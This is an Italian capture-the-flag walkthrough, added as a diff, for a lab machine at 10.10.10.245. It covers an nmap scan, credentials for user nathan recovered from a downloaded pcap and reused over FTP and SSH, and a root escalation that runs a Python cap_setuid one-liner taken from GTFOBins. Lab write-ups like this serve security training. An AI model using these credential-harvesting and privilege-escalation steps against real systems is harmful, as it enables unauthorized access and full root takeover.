@@ -1,0 +1,36 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.10.245
+---------------------------------------------------------------------------------------------------------------
+Analizziamo la pagina web presente sulla porta 80. C'è una sidebar con un paio di opzioni.
+Nella pagina Security Snapshot, ci sono vari indici. 
+Parto dall'indice 0 e scarico il file.
+Lo analizzo con wireshark "wireshark 0.pcap"
+Trovo le seguenti credenziali nei pacchetti:
+36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan
+40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!
+---------------------------------------------------------------------------------------------------------------
+Effettuo il login con ftp con le seguenti credenziali
+ftp 10.10.10.245
+ls -> Troviamo un file user.txt
+get user.txt -> Scarichiamo il file, lo leggiamo e troviamo la prima key
+---------------------------------------------------------------------------------------------------------------
+Effettuo il login con le stesse credenziali, ma stavolta usiamo ssh
+ssh nathan@10.10.10.245
+---------------------------------------------------------------------------------------------------------------
+Iniziamo a cercare qualcosa che faccia al caso nostro per ottenere i permessi root
+---------------------------------------------------------------------------------------------------------------
+getcap -r / 2>/dev/null
+
+Forse troviamo qualcosa di utile...
+
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+
+Cerchiamo su gtfobins, se abbiamo qualcosa che può fare al caso nostro.
+https://gtfobins.github.io/gtfobins/python/#capabilities
+
+Eseguiamo il seguente comando:
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+Otteniamo la shell come root.
+---------------------------------------------------------------------------------------------------------------
+cat /root/root.txt -> Otteniamo la seconda key
